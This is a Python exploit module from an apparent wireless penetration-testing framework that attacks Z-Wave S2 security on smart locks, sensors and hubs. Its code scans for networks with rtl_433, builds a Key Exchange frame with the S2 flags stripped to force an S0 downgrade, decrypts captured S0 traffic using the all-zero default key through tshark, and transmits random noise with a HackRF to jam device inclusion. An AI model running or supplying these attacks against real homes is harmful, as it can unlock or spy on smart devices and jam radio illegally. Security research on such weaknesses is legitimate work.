#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""Z-Wave S2 security downgrade and bypass module.

Attacks the Z-Wave S2 (Security 2) framework by forcing devices to
fall back to S0 or no security during inclusion. The S2 inclusion
process requires user interaction (DSK verification); by injecting
crafted Nonce Reports or manipulating the Key Exchange during inclusion,
an attacker can force the device to join with weaker S0 security
(which uses a known default key) or no security at all.

Z-Wave operates on 868.42 MHz (EU) / 908.42 MHz (US) and uses
the ITU-T G.9959 PHY. S2 was introduced in 2016 to replace the
broken S0 scheme (single network key, weak key exchange).

References:
  https://www.pentestpartners.com/security-blog/z-shave-exploiting-z-wave-downgrade-attacks/
  https://sensepost.com/blog/2019/z-wave-security/
  Silicon Labs Z-Wave 700 Series specifications

MITRE ATT&CK: T1557 (Adversary-in-the-Middle), T1562 (Impair Defenses)
CWE: CWE-757 (Selection of Less-Secure Algorithm During Negotiation)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import shutil
import struct
import subprocess
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)

ZWAVE_FREQ_US = 908.42
ZWAVE_FREQ_EU = 868.42
S0_DEFAULT_KEY = bytes(16)


class ZWaveSecurity(IntEnum):
    NONE = 0
    S0 = 1
    S2_UNAUTH = 2
    S2_AUTH = 3
    S2_ACCESS = 4


@dataclass
class ZWaveNode:
    node_id: int = 0
    home_id: str = ""
    security: ZWaveSecurity = ZWaveSecurity.NONE
    device_type: str = ""
    manufacturer: str = ""
    dsk: str = ""


@dataclass
class ZWaveNetwork:
    home_id: str = ""
    frequency_mhz: float = ZWAVE_FREQ_US
    nodes: list[ZWaveNode] = field(default_factory=list)
    controller_id: int = 1


class ZWaveS2Bypass(Exploit):
    """Z-Wave S2 security downgrade and bypass module."""

    __info__: dict[str, Any] = {
        "name": "Z-Wave S2 Bypass",
        "description": (
            "Downgrade Z-Wave S2 security to S0 or no encryption during "
            "device inclusion. Exploits the Key Exchange protocol to force "
            "weaker security negotiation. S0 uses a known default key."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://www.pentestpartners.com/security-blog/z-shave-exploiting-z-wave-downgrade-attacks/",
            "https://sensepost.com/blog/2019/z-wave-security/",
        ),
        "devices": (
            "Z-Wave smart locks",
            "Z-Wave sensors",
            "Z-Wave controllers (SmartThings, Hubitat, Vera)",
        ),
        "severity": "high",
        "cvss": "8.1",
        "cve": "generic",
        "mitre": ["T1557", "T1562"],
    }

    attack = OptString("scan", "Attack: scan, downgrade, s0_decrypt, replay, jam_inclusion")
    frequency = OptString("908.42", "Z-Wave frequency MHz (908.42 US, 868.42 EU)")
    sdr_device = OptString("hackrf", "SDR: hackrf, yardstick, rtlsdr (rx only)")
    target_home_id = OptString("", "Target Z-Wave Home ID (hex)")
    target_node = OptInteger(0, "Target node ID")
    capture_file = OptString("", "Z-Wave capture file for analysis")
    output_dir = OptString("zwave_output", "Output directory")
    dry_run = OptBool(False, "Print commands without executing")

    def check(self) -> str:
        """Verify SDR and Z-Wave tools."""
        tools_found: list[str] = []
        for tool in ("hackrf_transfer", "rfcat", "scapy", "rtl_433"):
            if shutil.which(tool):
                tools_found.append(tool)
        if not tools_found:
            return "No Z-Wave/SDR tools found. Install HackRF tools or rfcat."
        return f"Available: {', '.join(tools_found)}"

    def _scan_zwave_networks(self) -> list[ZWaveNetwork]:
        """Scan for Z-Wave networks using SDR."""
        freq = float(str(self.frequency.value))
        print_status(f"[*] Scanning for Z-Wave networks at {freq} MHz...")

        if shutil.which("rtl_433"):
            cmd = [
                "rtl_433",
                "-f", str(int(freq * 1e6)),
                "-R", "0",
                "-X", "name=zwave,modulation=FSK_PULSE_PCM,short=40,long=40,reset=400",
                "-T", "30",
            ]
        else:
            print_warning("[!] rtl_433 not found; using raw SDR capture")
            cmd = ["rtl_sdr", "-f", str(int(freq * 1e6)), "-s", "2000000", "-n", "4000000", "/dev/null"]

        if self.dry_run.value:
            print_info(f"[dry-run] {' '.join(cmd)}")
            return []

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=35)
            networks: list[ZWaveNetwork] = []
            for line in result.stdout.splitlines():
                if "Home" in line or "zwave" in line.lower():
                    net = ZWaveNetwork(frequency_mhz=freq)
                    networks.append(net)
                    print_success(f"    [+] {line.strip()}")
            return networks
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            print_error(f"[-] Scan failed: {exc}")
            return []

    def _downgrade_attack(self) -> None:
        """Force S2 to S0 downgrade during inclusion."""
        print_status("[*] Z-Wave S2 downgrade attack")
        print_info("[*] Strategy: intercept Key Exchange Set during inclusion")
        print_info("[*] and strip S2 capabilities, forcing S0 fallback")

        home_id = str(self.target_home_id.value)
        if not home_id:
            print_error("[-] Set target_home_id")
            return

        print_info(f"[*] Target Home ID: {home_id}")
        print_info("[*] Steps:")
        print_info("    1. Monitor for inclusion mode (Add Node)")
        print_info("    2. Intercept KEX Report from joining node")
        print_info("    3. Modify KEX Set: remove S2 keys, keep only S0")
        print_info("    4. Forward modified KEX Set to controller")
        print_info("    5. Node joins with S0 (known default key)")

        kex_report = struct.pack(
            "BBBBBB",
            0x87, 0x04,
            0x01,
            0x02,
            0x87,
            0x01 | 0x02 | 0x04,
        )
        print_info(f"    Original KEX Report: {kex_report.hex()}")

        kex_modified = bytearray(kex_report)
        kex_modified[5] = 0x00
        print_info(f"    Modified KEX Set (S2 stripped): {bytes(kex_modified).hex()}")

        if self.dry_run.value:
            print_info("[dry-run] Would inject modified KEX during inclusion")
            return

        print_warning("[!] Attack requires SDR TX capability and precise timing")
        print_info("[*] Use HackRF + GNU Radio or Yard Stick One for injection")

    def _s0_decrypt(self) -> None:
        """Decrypt S0-secured Z-Wave traffic using default key."""
        print_status("[*] Z-Wave S0 decryption")
        print_info(f"[*] S0 default network key: {S0_DEFAULT_KEY.hex()}")
        print_info("[*] S0 uses a single AES-128 key exchanged in cleartext")

        capture = str(self.capture_file.value)
        if not capture:
            print_error("[-] Set capture_file to Z-Wave pcap")
            return

        if not os.path.isfile(capture):
            print_error(f"[-] File not found: {capture}")
            return

        outdir = str(self.output_dir.value)
        os.makedirs(outdir, exist_ok=True)

        if shutil.which("tshark"):
            cmd = [
                "tshark", "-r", capture,
                "-o", f"zwave.network_key:{S0_DEFAULT_KEY.hex()}",
                "-Y", "zwave_cmd",
            ]
            if self.dry_run.value:
                print_info(f"[dry-run] {' '.join(cmd)}")
                return

            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                decrypted_file = os.path.join(outdir, "zwave_decrypted.txt")
                with open(decrypted_file, "w") as fh:
                    fh.write(result.stdout)
                print_success(f"[+] Decrypted traffic saved to {decrypted_file}")
                for line in result.stdout.splitlines()[:20]:
                    print_info(f"    {line}")
            except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
                print_error(f"[-] Decryption failed: {exc}")
        else:
            print_warning("[!] tshark not found; install Wireshark")

    def _jam_inclusion(self) -> None:
        """Jam Z-Wave inclusion process to force retry without S2."""
        freq = float(str(self.frequency.value))
        print_status(f"[*] Jamming Z-Wave inclusion at {freq} MHz")
        print_warning("[!] RF jamming may be illegal; authorized testing only")

        if self.dry_run.value:
            print_info("[dry-run] Would transmit noise on Z-Wave frequency")
            return

        if shutil.which("hackrf_transfer"):
            noise_file = os.path.join(str(self.output_dir.value), "noise.bin")
            os.makedirs(str(self.output_dir.value), exist_ok=True)
            with open(noise_file, "wb") as fh:
                fh.write(os.urandom(1_000_000))

            cmd = [
                "hackrf_transfer",
                "-t", noise_file,
                "-f", str(int(freq * 1e6)),
                "-s", "2000000",
                "-x", "40",
            ]
            print_info(f"[*] {' '.join(cmd)}")
            print_warning("[!] Transmitting for 2 seconds")
            try:
                subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                print_success("[+] Jam burst sent")
            except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
                print_error(f"[-] Jamming failed: {exc}")
        else:
            print_error("[-] HackRF required for TX")

    def run(self) -> None:
        """Execute Z-Wave S2 bypass."""
        print_status("[*] Z-Wave S2 Bypass v1.0.0")

        mode = str(self.attack.value).lower()

        if mode == "scan":
            self._scan_zwave_networks()
        elif mode == "downgrade":
            self._downgrade_attack()
        elif mode == "s0_decrypt":
            self._s0_decrypt()
        elif mode == "jam_inclusion":
            self._jam_inclusion()
        elif mode == "replay":
            print_status("[*] Z-Wave frame replay")
            print_info("[*] Capture frames with SDR, replay during inclusion window")
            if self.dry_run.value:
                print_info("[dry-run] Would replay captured Z-Wave frames")
        else:
            print_error(f"[-] Unknown attack: {mode}")
            print_info("[*] Available: scan, downgrade, s0_decrypt, replay, jam_inclusion")
